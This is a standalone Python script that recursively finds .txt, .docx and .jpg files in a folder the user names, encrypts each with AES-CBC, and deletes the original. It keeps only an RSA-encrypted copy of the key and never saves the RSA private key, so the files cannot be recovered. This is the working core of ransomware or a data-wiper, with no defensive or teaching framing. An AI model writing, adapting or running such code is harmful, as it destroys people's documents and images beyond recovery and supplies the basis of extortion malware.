import os
from cryptography.hazmat.primitives import padding, serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_pad
from cryptography.hazmat.backends import default_backend

# --- Settings ---
EXTENSIONS = ('.txt', '.docx', '.jpg')  # File types to search for and encrypt
USE_RSA = True  # Whether to encrypt the AES key with RSA for added security

# --- Generate AES Key ---
key = os.urandom(32)  # Generate a random 256-bit (32 bytes) AES key

# --- Optional: Encrypt AES Key with RSA ---
if USE_RSA:
    # Generate RSA private key
    private = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public = private.public_key()  # Extract the corresponding public key

    # Encrypt the AES key using the RSA public key with OAEP padding
    enc_key = public.encrypt(
        key,
        rsa_pad.OAEP(
            mgf=rsa_pad.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Save the encrypted AES key to a file
    with open("key.bin", "wb") as f:
        f.write(enc_key)
else:
    # If not using RSA, just save the raw AES key
    with open("key.bin", "wb") as f:
        f.write(key)

# --- Encrypt Files ---
folder = input("Folder path: ")  # Ask user for the directory to scan for files

# Walk through the folder recursively
for root, _, files in os.walk(folder):
    for name in files:
        # Check if file has one of the target extensions
        if name.endswith(EXTENSIONS):
            path = os.path.join(root, name)  # Full path to the file

            # Read file contents
            with open(path, 'rb') as f:
                data = f.read()

            # Pad data to match AES block size requirements
            padder = padding.PKCS7(128).padder()
            padded = padder.update(data) + padder.finalize()

            # Create a random initialization vector (IV) for CBC mode
            iv = os.urandom(16)

            # Set up AES cipher in CBC mode
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())

            # Encrypt the padded data
            encryptor = cipher.encryptor()
            enc = encryptor.update(padded) + encryptor.finalize()

            # Save the encrypted file (IV + encrypted data)
            with open(path + '.enc', 'wb') as f:
                f.write(iv + enc)

            # Remove the original file after encryption
            os.remove(path)

            # Print out a confirmation message
            print("Encrypted:", path)
